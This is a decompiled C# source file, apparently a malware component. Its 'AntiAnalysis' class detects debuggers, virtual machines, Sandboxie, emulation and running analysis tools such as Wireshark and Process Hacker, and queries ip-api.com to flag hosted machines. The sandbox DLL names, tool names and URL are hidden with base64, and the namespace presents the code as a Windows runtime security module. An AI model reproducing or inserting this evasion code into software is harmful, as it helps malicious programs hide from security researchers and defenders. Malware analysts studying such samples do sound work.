using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace WindowsRuntimeSecurity.MiscMethods;

internal class AntiAnalysis
{
	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	private static bool IsDebuggerAttached()
	{
		bool isDebuggerPresent = false;
		try
		{
			CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
			return isDebuggerPresent;
		}
		catch
		{
			return false;
		}
	}

	private static bool IsVirtualMachine()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
		ManagementObjectEnumerator enumerator;
		try
		{
			ManagementObjectCollection val2 = val.Get();
			try
			{
				enumerator = val2.GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						if ((current.get_Item("Manufacturer").ToString()!.ToLower() == "microsoft corporation" && current.get_Item("Model").ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || current.get_Item("Manufacturer").ToString()!.ToLower().Contains("vmware") || current.get_Item("Model").ToString() == "VirtualBox")
						{
							return true;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		catch
		{
			return true;
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementBaseObject current2 = enumerator.get_Current();
				if (current2.GetPropertyValue("Name").ToString()!.Contains("VMware") && current2.GetPropertyValue("Name").ToString()!.Contains("VBox"))
				{
					return true;
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return false;
	}

	private static bool IsEmulated()
	{
		try
		{
			long ticks = DateTime.Now.Ticks;
			Thread.Sleep(10);
			if (DateTime.Now.Ticks - ticks < 10L)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool IsSandBoxie()
	{
		string[] array = new string[5]
		{
			Encoding.UTF8.GetString(Convert.FromBase64String("U2JpZURsbC5kbGw=")),
			Encoding.UTF8.GetString(Convert.FromBase64String("U3hJbi5kbGw=")),
			Encoding.UTF8.GetString(Convert.FromBase64String("U2YyLmRsbA==")),
			Encoding.UTF8.GetString(Convert.FromBase64String("c254aGsuZGxs")),
			Encoding.UTF8.GetString(Convert.FromBase64String("Y21kdnJ0MzIuZGxs"))
		};
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				if (GetModuleHandle(array[num]).ToInt32() != 0)
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private static bool IsBlacklistedProcessesRunning()
	{
		Process[] processes = Process.GetProcesses();
		string[] source = new string[8]
		{
			Encoding.UTF8.GetString(Convert.FromBase64String("cHJvY2Vzc2hhY2tlcg==")),
			Encoding.UTF8.GetString(Convert.FromBase64String("bmV0c3RhdA==")),
			Encoding.UTF8.GetString(Convert.FromBase64String("bmV0bW9u")),
			Encoding.UTF8.GetString(Convert.FromBase64String("dGNwdmlldw==")),
			Encoding.UTF8.GetString(Convert.FromBase64String("d2lyZXNoYXJr")),
			Encoding.UTF8.GetString(Convert.FromBase64String("ZmlsZW1vbg==")),
			Encoding.UTF8.GetString(Convert.FromBase64String("cmVnbW9u")),
			Encoding.UTF8.GetString(Convert.FromBase64String("Y2Fpbg=="))
		};
		Process[] array = processes;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				Process process = array[num];
				if (source.Contains(process.ProcessName.ToLower()))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private static bool IsHosted()
	{
		try
		{
			return new WebClient().DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cDovL2lwLWFwaS5jb20vbGluZS8/ZmllbGRzPWhvc3Rpbmc="))).Contains("true");
		}
		catch
		{
		}
		return false;
	}

	public static bool IsAnalyzed()
	{
		if (IsHosted())
		{
			return true;
		}
		if (IsSandBoxie())
		{
			return true;
		}
		if (IsVirtualMachine())
		{
			return true;
		}
		if (IsDebuggerAttached())
		{
			return true;
		}
		if (IsEmulated())
		{
			return true;
		}
		if (IsBlacklistedProcessesRunning())
		{
			return true;
		}
		return false;
	}
}
